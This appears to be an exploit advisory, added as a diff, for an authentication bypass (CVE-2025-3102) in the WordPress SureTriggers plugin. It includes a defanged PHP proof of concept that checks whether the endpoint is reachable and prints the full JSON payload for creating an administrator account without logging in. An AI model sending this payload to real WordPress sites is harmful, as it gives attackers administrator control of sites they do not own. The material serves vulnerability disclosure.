@@ -1,0 +1,92 @@
+=============================================================================================================================================
+| # Title     : WordPress SureTriggers 1.0.78 Auth Bypass                                                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/suretriggers/                                                                                 |
+=============================================================================================================================================
+
+[+] Summary :
+
+The WordPress SureTriggers plugin versions <= 1.0.78 expose an
+unauthenticated REST endpoint that allows construction of a user
+creation payload. This POC demonstrates structure and logic only.
+No admin account is created, no plugin uploaded
+
+[+] References : ( https://packetstorm.news/files/id/192100/ 	CVE-2025-3102) 
+
+[+] Affected Product
+ - WordPress Plugin: SureTriggers
+ - Version: <= 1.0.78
+
+[+] Vector
+Unauthenticated REST access:
+  /wp-json/sure-triggers/v1/automation/action
+
+[+] Research Notes
+The endpoint accepts JSON payloads describing automation tasks.
+In vulnerable versions, no authorization validation is performed
+before processing the request. This POC validates reachability only.
+
+--------------------------------------------------------------------
+### SAFE PHP POC
+--------------------------------------------------------------------
+<?php
+
+$target = "http://example.com";
+$wp_user  = "poc_admin";
+$wp_pass  = "StrongPass123!";
+$wp_email = "poc@example.com";
+
+$create_url = $target . "/wp-json/sure-triggers/v1/automation/action";
+
+$payload = [
+    "integration" => "WordPress",
+    "type_event" => "create_user_if_not_exists",
+    "selected_options" => [
+        "user_name"  => $wp_user,
+        "password"   => $wp_pass,
+        "user_email" => $wp_email,
+        "role"       => "administrator"
+    ],
+    "fields"  => [],
+    "context" => []
+];
+
+echo "[SAFE_POC] Endpoint: $create_url\n";
+echo "[SAFE_POC] Would create: $wp_user : $wp_pass : $wp_email\n\n";
+
+$headers = @get_headers($create_url);
+if ($headers && strpos($headers[0], "200") !== false) {
+    echo "[CHECK] Endpoint reachable – further manual review required.\n";
+} else {
+    echo "[CHECK] Endpoint unreachable or non-200.\n";
+}
+
+echo "\n[PAYLOAD_PREVIEW]\n";
+echo json_encode($payload, JSON_PRETTY_PRINT) . "\n";
+
+echo "\n[END] Safe PoC complete.\n";
+?>
+
+--------------------------------------------------------------------
+### SAVE & RUN INSTRUCTIONS
+--------------------------------------------------------------------
+
+[1] Save file as:
+    suretriggers_poc.php
+
+[2] Place under your web root:
+    Windows (XAMPP):  C:\xampp\htdocs\
+    Linux (Apache):   /var/www/html/
+
+[3] Run via browser:
+    http://localhost/suretriggers_poc.php
+
+    OR from CLI:
+    php suretriggers_poc.php
+
+--------------------------------------------------------------------
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
